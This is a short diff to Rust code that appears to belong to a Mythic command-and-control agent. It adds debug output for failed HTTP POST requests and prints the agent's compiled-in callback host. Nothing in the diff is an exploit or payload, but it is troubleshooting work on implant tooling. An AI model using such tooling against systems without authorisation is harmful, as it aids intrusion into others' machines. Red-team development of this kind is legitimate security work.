@@ -69,9 +69,11 @@ fn http_post(url: &str, body: &str) -> Result<String, Box<dyn Error>> {
     let res = match req.send() {
         Ok(response) => response,
         Err(e) => {
+            eprintln!("DEBUG: HTTP request failed to {}", url);
+            eprintln!("DEBUG: Error: {}", e);
             return Err(std::io::Error::new(
                 std::io::ErrorKind::ConnectionRefused,
-                format!("Failed to make post request to {}: {}", url, e),
+                format!("Failed to make post request to {}: {}. Please check if the Mythic server is running and the URL is correct.", url, e),
             )
             .into());
         }
@@ -137,7 +139,12 @@ pub mod profilevars {
     // Helper function to get the C2 configured callback host
     pub fn cb_host() -> String {
         // Grab the callback host from the environment variable `callback_host`
-        String::from(env!("callback_host"))
+        let callback_host = String::from(env!("callback_host"));
+
+        // Debug: Print the callback host being used
+        eprintln!("DEBUG: Using callback host: {}", callback_host);
+
+        callback_host
     }
 
     // Helper function to get the C2 configured callback port
